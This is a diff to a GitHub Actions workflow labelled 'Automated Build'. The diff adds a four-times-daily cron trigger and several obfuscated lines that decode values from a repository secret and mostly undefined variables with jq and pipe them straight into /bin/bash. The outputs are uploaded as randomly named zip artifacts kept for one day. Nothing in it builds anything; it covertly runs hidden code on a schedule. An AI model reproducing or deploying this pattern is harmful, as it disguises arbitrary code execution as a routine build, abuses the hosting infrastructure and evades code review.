@@ -2,6 +2,8 @@ name: Automated Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '32 1,7,13,19 * * *'
 permissions:
   contents: read
   actions: read
@@ -15,16 +17,20 @@ jobs:
         uses: actions/checkout@v4
       - name: Go
         env:
-          bu6: ${{ secrets.bu6 }}
+          jw37379: ${{ secrets.jw37379 }}
         run: |
-          printf '%s' "$bu6" | jq -r .sojq570 | /bin/bash
-          echo $aewcx38 | jq -r .eygjl2 | /bin/bash
-          echo $ff8794 | jq -r .z48865 | /bin/bash
+          printf '%s' "$jw37379" | jq -r .zkf75982 | /bin/bash
+          echo $ujt0 | jq -r .wz374 | /bin/bash
+          echo $qcpi262 | jq -r .qq434 | /bin/bash
+          printf '%s' "$rmq5379" | jq -r .bendj0477 | /bin/bash
+          echo $pdn48559 | jq -r .gw84 | /bin/bash
+          printf '%s' "$zl2" | jq -r .jackk72 | /bin/bash
+          echo $ywabw14 | jq -r .rcqf6658 | /bin/bash
 
       - name: Archive results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: T6jiFbAe
+          name: PdUVKdUI
           path: "*.zip"
           retention-days: 1
